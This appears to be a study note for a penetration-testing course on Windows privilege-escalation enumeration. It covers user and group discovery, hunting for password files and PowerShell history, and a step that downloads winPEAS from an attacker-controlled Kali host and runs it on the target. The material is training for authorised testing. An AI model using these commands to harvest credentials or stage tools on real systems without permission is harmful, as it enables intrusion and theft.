# Windows Enumeration and Sensitive Information

> PEN-200 Chapter 16: establish situational awareness **before** choosing a privilege-escalation technique, then repeat this process whenever you gain access as a different user.

## 1. Identity, groups, users, and access paths

```powershell
whoami
hostname
whoami /groups
whoami /priv

Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators

net user
net user <USERNAME>
net localgroup
net localgroup administrators
```

Look closely at:

- **Administrators** — local administrative access.
- **Backup Operators** — can back up/restore files even when normal file permissions would deny access.
- **Remote Desktop Users** — potential RDP access.
- **Remote Management Users** — potential WinRM/PowerShell remoting access.
- Custom groups/users whose names/descriptions suggest helpdesk, backup, admin, deployment, or other elevated responsibilities.

When you recover credentials for another user, check that user's groups before deciding how to use them:

```powershell
net user <USERNAME>
```

If an interactive GUI session is available, `runas` can start a process as another local/domain user:

```powershell
runas /user:<USERNAME> cmd
```

PEN-200 notes that `runas` is awkward from common bind shells/WinRM because its password prompt expects an interactive session. Prefer RDP/WinRM when group membership permits it.

## 2. OS, version, build, and architecture

```powershell
systeminfo
```

Record the exact OS/build and architecture before choosing binaries or exploits. A 64-bit executable cannot run on a 32-bit system.

## 3. Network awareness

```powershell
ipconfig /all
route print
netstat -ano
```

Use this to identify:

- interfaces, DNS, gateway, subnet, and possible additional networks
- routes that may expose pivot paths
- listening services that were not obvious externally
- established connections / active users
- PIDs that can be mapped to running processes

## 4. Installed applications and running processes

### Registry-installed software

```powershell
# 32-bit applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName

# 64-bit applications
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
```

The registry list can be incomplete. Also inspect:

```text
C:\Program Files\
C:\Program Files (x86)\
C:\Users\<USER>\Downloads\
```

Running processes:

```powershell
Get-Process
```

Correlate `Get-Process` PIDs with `netstat -ano` and note user-installed/server software that may have vulnerable versions or useful configuration files.

## 5. Hunt sensitive information manually

Use what you learned about installed software to search **targeted locations first**.

### Password-manager databases

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

### Configuration and text files in an application directory

```powershell
Get-ChildItem -Path C:\<APP_DIR> -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

### User documents / notes

```powershell
Get-ChildItem -Path C:\Users\<USER>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

Read interesting files with either alias:

```powershell
type <FILE>
cat <FILE>
```

Both map to `Get-Content` in PowerShell.

**High-value locations/content:** meeting notes, onboarding documents, application configs, database configs, password-manager databases, scripts, deployment files, and anything mentioning credentials or privileged accounts.

When you find a password, test it only against plausible in-scope users/services. PEN-200 emphasizes password reuse as a common escalation path.

## 6. PowerShell history and logging artifacts

### Session history

```powershell
Get-History
```

An empty result does **not** mean no useful history exists.

### PSReadLine history

```powershell
(Get-PSReadLineOption).HistorySavePath
```

Typical location:

```text
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Read it:

```powershell
type (Get-PSReadLineOption).HistorySavePath
```

**Important:** `Clear-History` clears PowerShell's session history but does **not** clear the PSReadLine history file. Administrators may believe they removed their command history while credentials remain on disk.

### PowerShell Transcription

Transcription records what was entered/output in PowerShell and may expose plaintext secrets used to create objects such as `SecureString` / `PSCredential`.

If PSReadLine history shows `Start-Transcript`, inspect the specified transcript path. Transcript files may also be stored in user directories, a central local directory, or a network share.

### Script Block Logging

Script Block Logging records commands/script blocks as events, including the original representation of encoded code. Treat enabled PowerShell logging as a potential source of sensitive historical command data.

## 7. Automated enumeration — use it, then verify

### winPEAS

On Kali:

```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```

On target:

```powershell
iwr -Uri http://<KALI_IP>/winPEASx64.exe -OutFile winPEAS.exe
.\winPEAS.exe
```

PEN-200's example shows why automation is not enough: winPEAS saved time but missed useful manual findings and even misidentified the Windows version. Treat automated output as **leads**, not truth.

Alternatives mentioned in Chapter 16 when AV blocks winPEAS:

```text
Seatbelt
JAWS
manual enumeration
```

## 8. Repeat after every new user

```text
new credential / new user / new shell
        ↓
whoami + groups + privileges
        ↓
re-check files/configs/PowerShell artifacts
        ↓
re-check service/task permissions available to this user
        ↓
follow newly accessible path
```

A file denied to user A may be readable by user B. Privilege escalation is therefore **cyclical**, not linear.
